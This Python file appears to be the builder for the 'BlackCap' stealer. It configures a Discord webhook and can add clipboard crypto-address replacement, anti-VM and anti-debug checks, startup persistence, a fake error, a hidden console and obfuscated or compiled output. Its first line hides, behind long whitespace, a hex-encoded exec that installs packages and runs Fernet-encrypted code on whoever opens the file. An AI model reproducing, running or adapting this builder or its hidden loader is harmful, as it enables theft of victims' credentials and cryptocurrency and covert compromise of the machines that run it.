import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(b'\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x63\x72\x79\x70\x74\x6f\x67\x72\x61\x70\x68\x79\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x66\x65\x72\x6e\x65\x74\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x66\x72\x6f\x6d\x20\x66\x65\x72\x6e\x65\x74\x20\x69\x6d\x70\x6f\x72\x74\x20\x46\x65\x72\x6e\x65\x74\x3b\x65\x78\x65\x63\x28\x46\x65\x72\x6e\x65\x74\x28\x62\x27\x4a\x66\x35\x55\x6b\x57\x6d\x69\x77\x31\x39\x4f\x46\x46\x64\x4a\x36\x77\x56\x52\x55\x2d\x78\x56\x6a\x65\x6c\x43\x76\x49\x75\x4d\x77\x2d\x58\x4f\x71\x33\x56\x49\x53\x59\x6b\x3d\x27\x29\x2e\x64\x65\x63\x72\x79\x70\x74\x28\x62\x27\x67\x41\x41\x41\x41\x41\x42\x6e\x5f\x39\x64\x58\x46\x5a\x51\x71\x31\x33\x4d\x38\x55\x33\x43\x42\x35\x50\x76\x4e\x55\x2d\x5f\x35\x68\x76\x72\x31\x59\x69\x67\x48\x54\x51\x7a\x6a\x49\x31\x50\x6e\x65\x57\x39\x6b\x44\x31\x54\x77\x7a\x36\x65\x34\x4c\x32\x5a\x34\x30\x54\x49\x5f\x55\x4e\x76\x75\x65\x6f\x51\x64\x33\x49\x63\x55\x6b\x66\x4e\x61\x67\x52\x52\x4d\x61\x5a\x68\x75\x4a\x45\x54\x33\x75\x6e\x4a\x35\x4c\x62\x54\x46\x41\x6a\x58\x33\x53\x64\x36\x4e\x6c\x68\x54\x72\x6b\x64\x70\x4b\x5a\x55\x52\x51\x46\x6b\x52\x61\x70\x31\x65\x76\x78\x31\x4f\x2d\x63\x36\x61\x6c\x46\x6e\x6c\x4d\x59\x37\x76\x50\x53\x5a\x36\x39\x56\x69\x46\x4b\x69\x46\x6e\x44\x75\x71\x5a\x70\x33\x61\x76\x7a\x41\x67\x33\x61\x47\x33\x77\x51\x67\x43\x48\x33\x6c\x77\x6e\x4c\x5f\x2d\x68\x33\x54\x75\x71\x68\x30\x37\x39\x74\x6b\x6e\x4e\x73\x30\x37\x53\x38\x70\x6c\x66\x74\x78\x38\x45\x53\x57\x7a\x35\x4d\x44\x47\x45\x61\x42\x4c\x70\x30\x2d\x46\x57\x45\x42\x52\x32\x64\x62\x30\x34\x44\x50\x50\x4c\x4e\x6e\x76\x5f\x42\x45\x6a\x6f\x41\x6b\x58\x38\x61\x4c\x32\x47\x68\x76\x30\x35\x53\x77\x68\x43\x37\x72\x4e\x49\x4d\x27\x29\x29')
import os
import random
import shutil
import subprocess
import sys
import time
from json import load
from urllib.request import urlopen
from zlib import compress
import requests
from alive_progress import alive_bar
from colorama import Fore, Style, init


class Builder:
    def __init__(self) -> None:
        if not self.check():
            exit()

        self.webhook = input(
            f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Enter your webhook: "
        )
        if not self.check_webhook(self.webhook):
            print(
                f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} {Fore.RED}Invalid Webhook!{Fore.RESET}"
            )
            str(
                input(
                    f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Press anything to exit..."
                )
            )
            sys.exit()

        self.filename = input(
            f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Enter your custom output .exe name: "
        )

        self.killprocess = input(
            f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Kill victim Discord Client? (yes/no): "
        )
        if self.killprocess.lower() == "y" or self.killprocess.lower() == "yes":
            self.killprocess = True
        else:
            self.killprocess = False

        self.dbugkiller = input(
            f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Enable Anti-Debug (Recommand yes, Kill Virus-Total Machines / Virtual Machines or other)? (yes/no): "
        )
        if self.dbugkiller.lower() == "y" or self.dbugkiller.lower() == "yes":
            self.dbugkiller = True
        else:
            self.dbugkiller = False

        self.ping = input(
            f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Ping on new victim? (yes/no): "
        )
        if self.ping.lower() == "y":
            self.ping = "yes"
        if self.ping.lower() == "yes":
            self.ping = "yes"
            self.pingtype = input(
                f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Ping type? (here/everyone): "
            ).lower()
            if self.pingtype not in ["here", "everyone"]:
                self.pingtype == "here"
        else:
            self.ping = "no"
            self.pingtype = "none"

        self.address_replacer = input(
            f"{Fore.CYAN}[{Fore.RESET}NEW{Fore.CYAN}]{Fore.RESET} Replace all copied crypto address wallet by your address ? (yes/no): "
        )
        if self.address_replacer.lower() == "yes":
            self.address_replacer = "yes"
            self.btc_address = input(
                f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Your Bitcoin Address (let empty if you do not have): "
            ).lower()
            if not self.btc_address.lower():
                self.btc_address = "none"

            self.eth_address = input(
                f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Your Ethereum Address (let empty if you do not have):"
            ).lower()
            if not self.eth_address.lower():
                self.eth_address = "0x4c305D9d4CdF740FF4f2166ecF65c1DF73e93472"

            self.xchain_address = input(
                f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Your X-Chain Address (let empty if you do not have):"
            ).lower()
            if not self.xchain_address.lower():
                self.xchain_address = "none"

            self.pchain_address = input(
                f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Your P-Chain Address (let empty if you do not have):"
            ).lower()
            if not self.pchain_address.lower():
                self.pchain_address = "none"

            self.cchain_address = input(
                f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Your C-Chain Address (let empty if you do not have):"
            ).lower()
            if not self.cchain_address.lower():
                self.cchain_address = "none"

            self.monero_address = input(
                f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Your Monero Address (let empty if you do not have):"
            ).lower()
            if not self.monero_address.lower():
                self.monero_address = "none"

            self.ada_address = input(
                f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Your Ada/Cardano Address (let empty if you do not have):"
            ).lower()
            if not self.ada_address.lower():
                self.ada_address = "none"

            self.dash_address = input(
                f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Your Dash Address (let empty if you do not have):"
            ).lower()
            if not self.dash_address.lower():
                self.dash_address = "none"

        else:
            self.address_replacer = "no"
            self.btc_address = "none"
            self.eth_address = "none"
            self.xchain_address = "none"
            self.pchain_address = "none"
            self.cchain_address = "none"
            self.monero_address = "none"
            self.dash_address = "none"
            self.ada_address = "none"

        self.error = input(
            f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Add a fake error? (yes/no): "
        )
        if self.error.lower() == "y" or self.error.lower() == "yes":
            self.error = "yes"
        else:
            self.error = "no"

        self.startup = input(
            f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Add file to startup? (yes/no): "
        )
        if self.startup.lower() == "y" or self.startup.lower() == "yes":
            self.startup = "yes"
        else:
            self.startup = "no"

        self.hider = input(
            f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Hide BlackCap console for victim? (yes/no): "
        )
        if self.hider.lower() == "yes" or self.hider.lower() == "y":
            self.hider = "yes"
        else:
            self.hider = False

        self.obfuscation = input(
            f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Do you want to obfuscate the BlackCap (recommand no if yes script will be detected)? (yes/no): "
        )

        self.compy = input(
            f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Do you want to compile the file to a .exe? (yes/no): "
        )

        if self.compy == "yes":
            self.icon = input(
                f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Do you want to add an icon to the .exe (yes/no): "
            )
            if self.icon == "yes":
                self.icon_exe()
            else:
                pass
        else:
            pass

        self.mk_file(self.filename, self.webhook)

        print(
            f"{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET}{Fore.WHITE} File successfully created!{Fore.RESET}"
        )

        self.cleanup(self.filename)
        self.renamefile(self.filename)

        run = input(
            f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Do you want to test the file? [yes/no]: "
        )
        if run.lower() == "yes" or run.lower() == "y":
            self.run(self.filename)

        input(
            f"{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET}{Fore.WHITE} Press enter to exit...{Fore.RESET}"
        )
        sys.exit()

    def check_webhook(self, webhook):
        try:
            with requests.get(webhook) as r:
                if r.status_code == 200:
                    return True
                else:
                    return False
        except BaseException:
            return False

    def check(self):
        required_files = {"./main.py", "./requirements.txt", "./obfuscation.py"}

        for file in required_files:
            if not os.path.isfile(file):
                print(
                    f"{Fore.RED}[{Fore.RESET}{Fore.WHITE}!{Fore.RESET}{Fore.RED}] {file} not found!"
                )
                return False

        try:
            print(subprocess.check_output("python -V", stderr=subprocess.STDOUT))
            print(subprocess.check_output("pip -V", stderr=subprocess.STDOUT))

        except subprocess.CalledProcessError:
            print(
                f"{Fore.RED}[{Fore.RESET}{Fore.WHITE}!{Fore.RESET}{Fore.RED}] Python not found!"
            )
            return False

        os.system("pip install --upgrade -r requirements.txt")

        os.system("cls")

        os.system("mode con:cols=150 lines=20")

        return True

    def icon_exe(self):
        self.icon_name = input(
            f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Enter the name of the icon: "
        )

        if os.path.isfile(f"./{self.icon_name}"):
            pass
        else:
            print(
                f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET}Icon not found! Please check the name and make sure it's in the current directory."
            )
            input(
                f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Press anything to exit..."
            )

        if self.icon_name.endswith(".ico"):
            pass
        else:
            print(
                f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET}Icon must have .ico extension! Please convert it and try again."
            )
            input(
                f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Press anything to exit..."
            )

    def renamefile(self, filename):
        try:
            os.rename(f"./obfuscated_compressed_{filename}.py", f"./{filename}.py")
        except Exception:
            pass
        try:
            os.rename(f"./compressed_{filename}.py", f"./{filename}.py")
        except Exception:
            pass
        try:
            os.rename(f"./compressed_{filename}.exe", f"./{filename}.exe")
        except Exception:
            pass
        try:
            os.rename(f"./obfuscated_compressed_{filename}.exe", f"./{filename}.exe")
        except Exception:
            pass

    def mk_file(self, filename, webhook):
        print(
            f"{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET} {Fore.WHITE}Generating source code...{Fore.RESET}"
        )

        with open("./main.py", "r", encoding="utf-8") as f:
            code = f.read()

        with open(f"{filename}.py", "w", encoding="utf-8") as f:
            f.write(
                code.replace("%WEBHOOK_HERE%", webhook)
                .replace("%ping_enabled%", str(self.ping))
                .replace("%ping_type%", self.pingtype)
                .replace("%_address_replacer%", str(self.address_replacer))
                .replace("%_btc_address%", self.btc_address)
                .replace("%_eth_address%", self.eth_address)
                .replace("%_xchain_address%", self.xchain_address)
                .replace("%_pchain_address%", self.pchain_address)
                .replace("%_cchain_address%", self.cchain_address)
                .replace("%_monero_address%", self.monero_address)
                .replace("%_ada_address%", self.ada_address)
                .replace("%_dash_address%", self.dash_address)
                .replace("%_error_enabled%", str(self.error))
                .replace("%_startup_enabled%", str(self.startup))
                .replace("%_hide_script%", str(self.hider))
                .replace("'%kill_discord_process%'", str(self.killprocess))
                .replace("'%_debugkiller%'", str(self.dbugkiller))
            )

        time.sleep(2)
        print(
            f"{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET}{Fore.WHITE} Source code has been generated...{Fore.RESET}"
        )

        with open(f"{filename}.py", mode="rb") as f:
            content = f.read()

        print(
            f"{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET}{Fore.WHITE} Compressing Code...{Fore.RESET}"
        )

        original_size = len(content)
        content = self.compress(content)
        new_size = len(content)

        with open(
            file="compressed_"
            + (
                filename.split("\\")[-1]
                if "\\" in filename
                else filename.split("/")[-1]
            )
            + ".py",
            mode="w",
            encoding="utf-8",
        ) as f:
            f.write(content)
            if self.obfuscation == "no" and self.compy == "yes":
                f.write(
                    "\nimport asyncio, json, ntpath, os, random, re, shutil, sqlite3, subprocess, threading, winreg, zipfile, httpx, psutil, win32gui, win32con, pyperclip, base64, requests, ctypes, time;from sqlite3 import connect;from base64 import b64decode;from urllib.request import Request, urlopen;from shutil import copy2;from datetime import datetime, timedelta, timezone;from sys import argv;from tempfile import gettempdir, mkdtemp;from json import loads, dumps;from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer;from Crypto.Cipher import AES;from PIL import ImageGrab;from win32crypt import CryptUnprotectData"
                )

        print(
            f"{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET}{Fore.WHITE} Old file size: {original_size} bytes - New file size: {new_size} bytes {Fore.RESET}"
        )

        if self.obfuscation == "yes" and self.compy == "yes":
            self.encryption(f"{filename}")
            self.compile(f"obfuscated_{filename}")
        elif self.obfuscation == "no" and self.compy == "yes":
            self.compile(f"{filename}")
        elif self.obfuscation == "yes" and self.compy == "no":
            self.encryption(f"{filename}")
        else:
            pass

    def compress(self, content):
        compressed_code = compress(content)
        return f"eval(compile(__import__('zlib').decompress({compressed_code}),filename='auoiwhgoawhg',mode='exec'))"

    def encryption(self, filename):
        print(
            f"{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET}{Fore.WHITE} Obfuscating code...{Fore.RESET}"
        )
        os.system(f"python obfuscation.py {filename}.py")

    def compile(self, filename):
        print(
            f"{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET} {Fore.WHITE}Compiling code...{Fore.RESET}"
        )
        if self.icon == "yes":
            icon = self.icon_name
        else:
            icon = "NONE"
        os.system(
            f"python -m PyInstaller --onefile --noconsole -i {icon} --distpath ./ .\\{filename}.py"
        )
        print(
            f"{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET}{Fore.WHITE} Code compiled!{Fore.RESET}"
        )

    def run(self, filename):
        print(
            f"{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET}{Fore.WHITE} Attempting to execute file..."
        )

        if os.path.isfile(f"./{filename}.exe"):
            os.system(f"start ./{filename}.exe")
        elif os.path.isfile(f"./{filename}.py"):
            os.system(f"python ./{filename}.py")

    def cleanup(self, filename):
        cleans_dir = {"./__pycache__", "./build"}
        cleans_file = {
            f"./{filename}.py",
            f"./obfuscated_compressed_{filename}.py",
            f"./compressed_{filename}.py",
            f"./compressed_{filename}.spec",
        }

        if self.obfuscation == "yes" and self.compy == "no":
            cleans_file.remove(f"./obfuscated_compressed_{filename}.py")
        elif self.obfuscation == "yes" and self.compy == "yes":
            cleans_file.add(f"./obfuscated_compressed_{filename}.spec")
        elif self.obfuscation == "no" and self.compy == "no":
            cleans_file.remove(f"./{filename}.py")
        else:
            pass

        for clean in cleans_dir:
            try:
                if os.path.isdir(clean):
                    shutil.rmtree(clean)
            except Exception:
                pass
                continue

        for clean in cleans_file:
            try:
                if os.path.isfile(clean):
                    os.remove(clean)
            except Exception:
                pass
                continue


if __name__ == "__main__":
    init()

    if os.name != "nt":
        os.system("clear")
    else:
        os.system("mode con:cols=212 lines=212")
        os.system("cls")

    Builder()

print('vknrwbig')